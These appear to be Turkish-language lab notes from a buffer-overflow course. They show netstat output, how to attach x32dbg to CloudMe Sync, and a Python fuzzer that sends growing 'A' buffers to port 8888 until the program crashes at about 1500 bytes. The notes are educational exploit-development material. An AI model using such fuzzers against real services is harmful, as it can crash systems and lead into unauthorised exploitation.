# Remote Fuzzing

## Listening Ports

```pwsh
PS C:\Users\htb-student> netstat -a
```

```output title="Output" hl_lines="17"
Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:445            WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:3389           WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:5040           WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:49664          WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:49665          WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:49666          WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:49667          WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:49668          WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:50783          WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:50784          WIN32BOF-WS01:0        LISTENING
  TCP    10.129.43.22:139       WIN32BOF-WS01:0        LISTENING
  TCP    10.129.43.22:3389      10.10.15.166:34722     ESTABLISHED
  TCP    127.0.0.1:8888         WIN32BOF-WS01:0        LISTENING
  TCP    [::]:135               WIN32BOF-WS01:0        LISTENING
  TCP    [::]:445               WIN32BOF-WS01:0        LISTENING
  TCP    [::]:3389              WIN32BOF-WS01:0        LISTENING
  TCP    [::]:49664             WIN32BOF-WS01:0        LISTENING
  TCP    [::]:49665             WIN32BOF-WS01:0        LISTENING
  TCP    [::]:49666             WIN32BOF-WS01:0        LISTENING
  TCP    [::]:49667             WIN32BOF-WS01:0        LISTENING
  TCP    [::]:49668             WIN32BOF-WS01:0        LISTENING
  TCP    [::]:50783             WIN32BOF-WS01:0        LISTENING
  TCP    [::]:50784             WIN32BOF-WS01:0        LISTENING
  UDP    0.0.0.0:500            *:*
  UDP    0.0.0.0:3389           *:*
  UDP    0.0.0.0:4500           *:*
  UDP    0.0.0.0:5050           *:*
  UDP    0.0.0.0:5353           *:*
  UDP    0.0.0.0:5355           *:*
  UDP    0.0.0.0:54580          *:*
  UDP    0.0.0.0:58607          *:*
  UDP    0.0.0.0:58939          *:*
  UDP    0.0.0.0:61356          *:*
  UDP    10.129.43.22:137       *:*
  UDP    10.129.43.22:138       *:*
  UDP    10.129.43.22:1900      *:*
  UDP    10.129.43.22:54311     *:*
  UDP    127.0.0.1:1900         *:*
  UDP    127.0.0.1:53902        *:*
  UDP    127.0.0.1:54312        *:*
  UDP    [::]:500               *:*
  UDP    [::]:3389              *:*
  UDP    [::]:4500              *:*
  UDP    [::]:5353              *:*
  UDP    [::]:5355              *:*
  UDP    [::]:54580             *:*
  UDP    [::]:58607             *:*
  UDP    [::]:58939             *:*
  UDP    [::]:61356             *:*
  UDP    [::1]:1900             *:*
  UDP    [::1]:54310            *:*
  UDP    [fe80::3060:995b:92fc:e44f%10]:1900  *:*
  UDP    [fe80::3060:995b:92fc:e44f%10]:54309  *:*
```

## Attach

CloudMe Sync programını başlat.

Programı [x32dbg](https://github.com/x64dbg/x64dbg) üzerinde açmak için aşağıda verilen yolu takip et:

* File
* Attach
* C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe
* Attach

## Code

```python title="program.py" linenums="1" hl_lines="8 14"
import socket
import struct


def remote_fuzz():
    try:
        for i in range(0, 10000, 500):
            payload = b'A' * i

            print(f'Fuzzing {i} bytes')

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect(('127.0.0.1', 8888))

            s.send(payload)

            s.close()
    except:
        print('Could not establish a connection')


remote_fuzz()
```

## Fuzzing Remote Port

Kodu çalıştır:

```pwsh
PS C:\Users\htb-student> python .\program.py
```

```output title="Output"
Fuzzing 0 bytes
Fuzzing 500 bytes
Fuzzing 1000 bytes
Fuzzing 1500 bytes
Fuzzing 2000 bytes
Fuzzing 2500 bytes
Fuzzing 3000 bytes
Fuzzing 3500 bytes
Fuzzing 4000 bytes
Fuzzing 4500 bytes
Fuzzing 5000 bytes
Fuzzing 5500 bytes
Fuzzing 6000 bytes
Fuzzing 6500 bytes
Fuzzing 7000 bytes
Fuzzing 7500 bytes
Fuzzing 8000 bytes
Fuzzing 8500 bytes
Fuzzing 9000 bytes
Fuzzing 9500 bytes
```

Kod çalışırken herhangi bir hata alınmadı.

Program crash verdi.

Yani dinleyen servis crash vermiyor, girdiyi işleyen ön uç crash veriyor:

```text title="Paused"
First chance exception 41414141 (C0000005, EXCEPTION_ACCESS_VIOLATION)!
```

## Gradual Fuzzing

Kodun ilgili kısmını güncelle:

```python title="program.py" linenums="16" hl_lines="2"
            s.send(buffer)
            breakpoint()
            s.close()
```

Kodu çalıştır:

```pwsh
PS C:\Users\htb-student> python .\program.py
```

```output title="Output"
Fuzzing 0 bytes
> c:\users\htb-student\program.py(19)remote_fuzz()
-> s.close()
```

Program crash vermedi, devam:

```pwsh
(Pdb) continue
```

```output title="Output"
Fuzzing 500 bytes
> c:\users\htb-student\program.py(17)remote_fuzz()
-> breakpoint()
```

Program crash vermedi, devam:

```pwsh
(Pdb) continue
```

```output title="Output"
Fuzzing 1000 bytes
> c:\users\htb-student\program.py(19)remote_fuzz()
-> s.close()
```

Program crash vermedi, devam:

```pwsh
(Pdb) continue
```

```output title="Output"
Fuzzing 1500 bytes
> c:\users\htb-student\program.py(17)remote_fuzz()
-> breakpoint()
```

Program crash verdi (1500 bytes):

```text title="Paused"
First chance exception 41414141 (C0000005, EXCEPTION_ACCESS_VIOLATION)!
```
